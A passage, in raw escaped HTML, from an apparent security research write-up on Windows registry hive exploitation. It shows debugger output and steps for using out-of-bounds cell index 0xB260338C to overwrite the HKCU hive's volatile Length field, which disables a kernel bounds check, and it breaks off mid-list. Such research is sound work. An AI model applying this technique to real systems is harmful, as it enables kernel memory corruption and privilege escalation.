class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;NULL)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;KeBugCheckEx(REGISTRY_ERROR,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(ULONG_PTR)Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Cell,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x267);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Context-&amp;gt;Cell&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;-1;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Context-&amp;gt;BinContext&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The bounds check &lt;/span&gt;&lt;span&gt;on &lt;/span&gt;&lt;span&gt;the cell index is clearly still present, but it doesn&amp;#39;t serve any real purpose.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Based on this&lt;/span&gt;&lt;span&gt;, we can assume that this is more likely a historical relic rather than a mitigation deliberately added by the developers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Still, it interferes with our carefully crafted exploitation technique.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Does this mean that OOB cell indexes are not viable because their use will always result in a forced BSoD, and we have to look for other privilege escalation methods instead?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c36 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As it turns out, not necessarily.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Indeed, if the bounds check was located in the HvpGetCellPaged function, there wouldn&amp;#39;t be much to discuss &amp;ndash; a blue screen would always occur right before using any OOB index, completely neutralizing this idea&amp;#39;s usefulness.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, as things stand, resolving such an index works without issues, and we can perform a single invalid memory operation before a crash occurs in the release call.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In many ways, this sounds like a &amp;quot;pwn&amp;quot; task straight out of a CTF, where the attacker is given a memory corruption primitive that is theoretically exploitable, but somehow artificially limited, and the goal is to figure out how to cleverly bypass this limitation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Let&amp;#39;s take another look at the if statement that stands in our way:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(StorageIndex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2 ormwWEjHLs-c37&quot;&gt;Hive-&amp;gt;Storage[StorageType].Length&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;/*&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c25&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*/)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;KeBugCheckEx(REGISTRY_ERROR,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(ULONG_PTR)Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Cell,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x267);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The index is compared against the value of the long-lived _HHIVE.Storage[StorageType].Length field, which is located at a constant offset from the beginning of the _HHIVE structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On the Windows 11 system I tested, this offset is 0x118 for stable storage and 0x390 for volatile storage&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((_HHIVE*)0)-&amp;gt;Storage[0].Length)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((_HHIVE*)0)-&amp;gt;Storage[0].Length)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c10 ormwWEjHLs-c2&quot;&gt;0x118&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((_HHIVE*)0)-&amp;gt;Storage[1].Length)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((_HHIVE*)0)-&amp;gt;Storage[1].Length)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c10 ormwWEjHLs-c2&quot;&gt;0x390&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As we established earlier, the special out-of-bounds index 0xB2603000 points to the base address of the _CMHIVE / _HHIVE structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;By adding one of the offsets above, we can obtain an index that points directly to the Length field.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Let&amp;#39;s test this in practice&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CMHIVE*)0xffff810713f82000)-&amp;gt;Hive.Storage[1].Length)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(&amp;amp;((nt!_CMHIVE*)0xffff810713f82000)-&amp;gt;Hive.Storage[1].Length)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2 ormwWEjHLs-c37&quot;&gt;0xffff810713f82390&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cellindex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xffff810713f82000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xB2603390-4&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff810713f823a0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Table&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;193&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Offset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;38c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MapTable&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff810713debe90&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MapEntry&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff810713debed8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BinAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff810713f82000,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff810713f82000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pcell:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2 ormwWEjHLs-c37&quot;&gt;ffff810713f82390&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;So, indeed, index &lt;/span&gt;&lt;span&gt;0xB260338C&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to the field representing the length of the volatile space in the HKCU hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is very good news&lt;/span&gt;&lt;span&gt;&amp;nbsp;for an attacker&lt;/span&gt;&lt;span&gt;, because it means that they are able to neutralize the bounds check in HvpReleaseCellPaged by performing the following steps:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_cuzd0pwxkzwj-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Crafting &lt;/span&gt;&lt;span&gt;a controlled registry value with a data index of 0xB260338C.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Setting this value programmatically to a very large number, such as&lt;/span&gt;&lt;span&gt;&amp;nbsp;0xFFFFFFFF, and thus overwriting the _HHIVE.Storage[1].Length &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;field with it.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;During the NtSetValueKey syscall in step 2, when HvpReleaseCellPaged is called on index 0xB260338C, the Length member has already been corrupted.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result, the condition checked by the function is not satisfied, and the KeBugCheckEx call never occurs.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;Since the _HHIVE.Storage[1].Length field is located in a global hive object and does not change very often (unless the storage space 